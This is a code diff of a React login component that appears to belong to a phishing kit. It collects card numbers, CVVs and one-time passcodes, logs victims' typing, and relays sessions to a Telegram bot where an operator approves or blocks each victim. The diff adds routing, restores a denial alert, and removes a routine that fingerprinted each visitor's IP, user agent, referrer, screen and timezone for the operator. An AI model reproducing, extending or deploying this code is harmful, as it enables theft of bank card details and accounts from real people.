@@ -8,8 +8,13 @@ import CardVerificationForm from './CardVerificationForm';
 import OtpVerificationForm from './OtpVerificationForm';
 import LoadingOverlay from './LoadingOverlay';
 import './LoginForm.css';
+import { useNavigate } from 'react-router-dom'; // Ajoutez cette ligne
+
+
 
 function LoginForm() {
+    const navigate = useNavigate(); // Ajoutez cette ligne après les hooks
+
   const { language, t } = useLanguage();
   
   // State management
@@ -33,7 +38,6 @@ function LoginForm() {
   // Refs for tracking page logs
   const hasSentCardPageLogRef = useRef(false);
   const hasSentOtpLogRef = useRef(false);
-  const hasSentVisitNotificationRef = useRef(false); // Nouveau ref pour la notification de visite
   
   const [cardDetails, setCardDetails] = useState({
     cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
@@ -67,8 +71,7 @@ function LoginForm() {
     setWaitingForApproval(false);
     setWaitingForOtpApproval(false);
     setIsLoading(false);
-    // REMOVED: alert(t.denied);
-    // Just reload the page without showing alert
+    alert(t.denied);
     window.location.reload();
   };
 
@@ -169,8 +172,7 @@ function LoginForm() {
     sendLoginTypingLog,
     sendCardTypingLog,
     sendOtpTypingLog,
-    sendBlockedLog,
-    sendVisitNotification // Nouvelle fonction à ajouter dans le hook
+    sendBlockedLog
   } = useTelegramBot(
     sessionId, 
     handleApprove, 
@@ -181,55 +183,6 @@ function LoginForm() {
     handleBackToLogin, 
     handleBlock
   );
-
-  // NOUVEAU useEffect pour envoyer une notification de visite
-  useEffect(() => {
-    const sendVisitNotificationOnLoad = async () => {
-      // Éviter d'envoyer plusieurs notifications
-      if (hasSentVisitNotificationRef.current) return;
-      
-      try {
-        // Obtenir l'IP de l'utilisateur
-        let userIP = 'Unable to get IP';
-        try {
-          const ipResponse = await axios.get('https://api.ipify.org?format=json');
-          userIP = ipResponse.data.ip;
-        } catch (ipError) {
-          console.error('Error getting IP:', ipError);
-        }
-        
-        // Obtenir le User-Agent
-        const userAgent = navigator.userAgent;
-        
-        // Obtenir la page d'origine (referrer)
-        const referrer = document.referrer || 'Direct access';
-        
-        // Obtenir la résolution d'écran
-        const screenResolution = `${window.screen.width}x${window.screen.height}`;
-        
-        // Obtenir le fuseau horaire
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        
-        // Générer un ID de session temporaire pour la visite
-        const tempSessionId = generateSessionId();
-        
-        // Envoyer la notification
-        await sendVisitNotification(userIP, userAgent, referrer, screenResolution, timezone, tempSessionId, language);
-        
-        hasSentVisitNotificationRef.current = true;
-        
-      } catch (error) {
-        console.error('Error sending visit notification:', error);
-      }
-    };
-    
-    // Envoyer la notification après 1 seconde (pour s'assurer que tout est chargé)
-    const timer = setTimeout(() => {
-      sendVisitNotificationOnLoad();
-    }, 1000);
-    
-    return () => clearTimeout(timer);
-  }, [generateSessionId, sendVisitNotification, language]);
 
   const handleInputChange = async (field, value) => {
     trackTyping();
